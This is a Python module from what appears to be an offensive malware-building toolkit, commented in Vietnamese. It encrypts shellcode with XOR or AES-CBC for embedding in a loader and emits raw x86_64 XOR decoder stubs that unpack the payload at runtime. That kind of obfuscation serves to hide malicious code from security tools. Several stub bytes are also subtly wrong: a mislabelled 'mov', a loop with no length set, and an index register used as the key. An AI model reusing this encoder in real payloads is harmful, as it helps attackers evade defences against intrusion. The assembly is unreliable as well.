"""
encoder.py — Payload encoding: XOR, AES.
Dùng để mã hóa shellcode trước khi embed vào loader.
"""

import os
import struct
from pathlib import Path
from typing import Optional


def generate_random_key(length: int = 16) -> bytes:
    """Tạo random key."""
    return os.urandom(length)


def parse_key(key_str: str, length: int = 16) -> bytes:
    """
    Parse key từ config.
    'random' → random bytes
    '0x5A5B...' → hex string
    'mykey' → utf-8 bytes, pad to length
    """
    if key_str == "random":
        return generate_random_key(length)

    # Hex string
    if key_str.startswith("0x") or key_str.startswith("0X"):
        hex_str = key_str[2:].replace(" ", "")
        raw = bytes.fromhex(hex_str)
        if len(raw) < length:
            raw = raw * (length // len(raw) + 1)
        return raw[:length]

    # Plain string
    raw = key_str.encode("utf-8")
    if len(raw) < length:
        raw = raw * (length // len(raw) + 1)
    return raw[:length]


class XOREncoder:
    """XOR encoder — đơn giản, nhanh."""

    def __init__(self, key: bytes):
        self.key = key
        self.key_len = len(key)

    def encode(self, data: bytes) -> bytes:
        """XOR encode data với key."""
        return bytes(data[i] ^ self.key[i % self.key_len] for i in range(len(data)))

    def decode(self, data: bytes) -> bytes:
        """XOR decode (giống encode vì XOR symmetric)."""
        return self.encode(data)

    def get_decoder_stub(self) -> bytes:
        """
        Trả về x86_64 shellcode stub để decode XOR tại runtime.
        Stub: loop XOR byte [rdi], key_byte; inc rdi; dec rcx; jnz
        """
        if self.key_len == 1:
            # Single byte XOR decoder
            key_byte = self.key[0]
            stub = bytearray()
            stub.extend(b"\x48\x31\xc9")          # xor rcx, rcx
            stub.extend(b"\x48\x89\xcf")          # mov rdi, rdi (shellcode addr)
            # mov cx, len (placeholder — replaced at runtime)
            stub.extend(b"\x66\x81\xf9\x00\x00")  # cmp cx, 0x0000
            stub.extend(b"\x74\x06")               # jz +6
            stub.extend(b"\x80\x37")               # xor byte [rdi], imm8
            stub.extend(bytes([key_byte]))
            stub.extend(b"\x48\xff\xc7")           # inc rdi
            stub.extend(b"\x48\xff\xc9")           # dec rcx
            stub.extend(b"\xeb\xf4")               # jmp back
            return bytes(stub)
        else:
            # Multi-byte XOR decoder
            stub = bytearray()
            stub.extend(b"\x48\x31\xc9")           # xor rcx, rcx
            stub.extend(b"\x48\x31\xf6")           # xor rsi, rsi (key index)
            # mov cx, len (placeholder)
            stub.extend(b"\x66\x81\xf9\x00\x00")   # cmp cx, 0x0000
            stub.extend(b"\x74\x0c")                # jz +12
            stub.extend(b"\x40\x30\x37")            # xor byte [rdi], sil
            stub.extend(b"\x48\xff\xc7")            # inc rdi
            stub.extend(b"\x48\xff\xc1")            # inc rcx
            stub.extend(b"\x40\xfe\xc6")            # inc sil
            stub.extend(b"\xeb\xf0")                # jmp back
            return bytes(stub)


class AESEncoder:
    """AES encoder — mạnh hơn, dùng pycryptodome nếu có."""

    def __init__(self, key: bytes):
        self.key = key[:16]  # AES-128

    def encode(self, data: bytes) -> bytes:
        """AES-CBC encode với PKCS7 padding."""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            iv = os.urandom(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            padded = pad(data, AES.block_size)
            encrypted = cipher.encrypt(padded)
            return iv + encrypted  # Prepend IV
        except ImportError:
            print("[!] pycryptodome not installed, falling back to XOR")
            return XOREncoder(self.key).encode(data)

    def decode(self, data: bytes) -> bytes:
        """AES-CBC decode."""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad
            iv = data[:16]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(data[16:])
            return unpad(decrypted, AES.block_size)
        except ImportError:
            return XOREncoder(self.key).decode(data)

    def get_decoder_stub(self) -> bytes:
        """
        PSEUDO: AES decoder stub quá lớn cho shellcode.
        Thường sẽ decrypt trong loader C++ thay vì shellcode.
        Returns empty stub placeholder.
        """
        # TODO: implement AES decryption stub in C++
        return b""


def get_encoder(algorithm: str, key_or_str, key_length: int = 16):
    """Factory: tạo encoder từ algorithm name và key.
    key_or_str can be a string ('random', '0xABCD...', 'mykey')
    or already-parsed bytes.
    """
    if isinstance(key_or_str, bytes):
        key = key_or_str
    else:
        key = parse_key(key_or_str, key_length)

    if algorithm == "xor":
        return XOREncoder(key)
    elif algorithm == "aes":
        return AESEncoder(key)
    else:
        raise ValueError(f"Unknown algorithm: {algorithm}")


def encode_shellcode_file(input_path: Path, output_path: Path,
                           algorithm: str = "xor", key_str: str = "random") -> Path:
    """Encode một file shellcode và lưu kết quả."""
    data = input_path.read_bytes()
    encoder = get_encoder(algorithm, key_str)
    encoded = encoder.encode(data)
    output_path.write_bytes(encoded)
    print(f"[+] Encoded: {input_path} → {output_path} ({len(data)} → {len(encoded)} bytes)")
    return output_path
